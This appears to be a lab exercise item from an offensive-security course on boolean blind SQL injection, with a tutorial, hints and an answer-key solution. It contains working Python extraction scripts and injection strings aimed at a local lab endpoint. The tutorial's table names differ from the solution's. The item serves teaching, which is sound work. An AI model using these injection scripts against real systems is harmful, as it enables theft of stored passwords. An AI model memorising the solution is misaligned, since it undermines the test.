- id: offsec-web-033
  title: Extract the secret one bit at a time
  difficulty: 4
  kind: build
  tags: [web, blind-sqli, boolean, extraction]
  tutorial: |
    **What you're learning.** Blind SQL injection, extracting a value bit by bit or character by character.

    ### The idea

    The endpoint only says `exists`/`no such user`, a boolean oracle. Ask yes/no questions about the secret: `substr(secret,N,1)='c'`, or compare its bits, until you reconstruct it (offsec-web-003's Part 3, generalised).

    ### Commands you'll use

    ```python
    import urllib.parse, urllib.request
    base = "http://127.0.0.1:8092/check?user="
    def truthy(cond):
        u = "admin' AND (%s) -- " % cond
        return "exists" in urllib.request.urlopen(base + urllib.parse.quote(u)).read().decode()
    # length then characters
    n = 1
    while not truthy("length((SELECT flag FROM secret))=%d" % n): n += 1
    out = ""
    for i in range(1, n + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truthy("ascii(substr((SELECT flag FROM secret),%d,1))>%d" % (i, mid)): lo = mid + 1
            else: hi = mid
        out += chr(lo)
    print(out)
    ```
    Binary search over the ASCII code is ~7 requests per character versus ~95 for linear.

    ### Common mistakes

    - Linear character search (slow): use binary search on `ascii()`.
    - Forgetting the comment `-- ` and the closing quote.

    ### Check your work

    The reconstructed `KL{...}` matches the secret.
  scenario: |
    The lookup at **`http://127.0.0.1:8092/check?user=NAME`** answers
    **`exists`** or **`no such user`** and passes `user` straight into a SQL
    `WHERE`. A row `secret / <flag>` is in the table. Through boolean blind
    injection, extract the **`secret` user's password** (the flag) and write
    the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`user=admin' AND '1'='1` says exists; `user=admin' AND '1'='2` says no — the input is injectable."
    - "Leak length and characters: `admin' AND (SELECT substr(password,N,1) FROM users WHERE username='secret')='c' -- `."
    - "Binary-search each position with `... > 'c'` for speed, over the KL flag charset `KL{0-9a-f}`."
  solution: |
    ```bash
    python3 - <<'PY' > /lab/flag.txt
    import urllib.parse, urllib.request
    base = "http://127.0.0.1:8092/check?user="
    def truthy(cond):
        u = "admin' AND (%s) -- " % cond
        body = urllib.request.urlopen(base + urllib.parse.quote(u)).read().decode()
        return "exists" in body
    # length
    n = next(i for i in range(1, 60) if truthy("(SELECT length(password) FROM users WHERE username='secret')=%d" % i))
    out = []
    for pos in range(1, n + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truthy("(SELECT unicode(substr(password,%d,1)) FROM users WHERE username='secret')>%d" % (pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
    print("".join(out))
    PY
    ```
